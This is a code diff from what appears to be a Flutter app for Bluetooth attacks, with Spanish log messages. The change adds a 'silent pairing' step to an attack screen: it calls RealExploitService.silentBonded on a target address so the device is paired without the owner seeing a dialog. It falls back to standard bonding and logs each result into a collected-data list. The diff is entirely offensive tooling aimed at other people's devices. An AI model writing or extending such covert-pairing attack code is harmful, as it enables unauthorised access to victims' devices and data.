@@ -2849,12 +2849,23 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
         // DIAGNÓSTICO lo indicará y podrás activar el toggle en el menú ⋮.
         if (_autoBonding) {
           try {
-            _appendLog('🤝 [FASE -2] Bonding automático ACTIVO — emparejando con el objetivo...');
-            final bonded = await RealExploitService.ensureBonded(address);
-            if (bonded) {
-              _appendLog('   ✅ Objetivo emparejado (o ya lo estaba)');
+            _appendLog('🤫 [FASE -2] Intentando EMPAREJAMIENTO SILENCIOSO...');
+            final sp = await RealExploitService.silentBonded(address);
+            final method = sp['method']?.toString() ?? '?';
+            final msg = (sp['message'] ?? sp['error'] ?? 'sin detalle').toString();
+            if (sp['success'] == true) {
+              _appendLog('   ✅ $msg');
+              _collectedData.add('🤫 [$displayName] Emparejamiento silencioso OK ($method)');
+              if (mounted) setState(() {});
+              _saveState();
             } else {
-              _appendLog('   ⚠️ No se pudo emparejar (¿diálogo rechazado en pantalla del objetivo?)');
+              _appendLog('   ⚠️ Silencioso falló ($method): $msg');
+              // Fallback honesto: pareo normal SOLO si el usuario activó el toggle
+              _appendLog('   🤝 Reintentando con bonding estándar (puede mostrar diálogo en el objetivo)...');
+              final bonded = await RealExploitService.ensureBonded(address);
+              _appendLog(bonded
+                  ? '   ✅ Objetivo emparejado vía bonding estándar'
+                  : '   ❌ Bonding no completado');
             }
           } catch (e) {
             _appendLog('   ⚠️ Emparejamiento no disponible: $e');
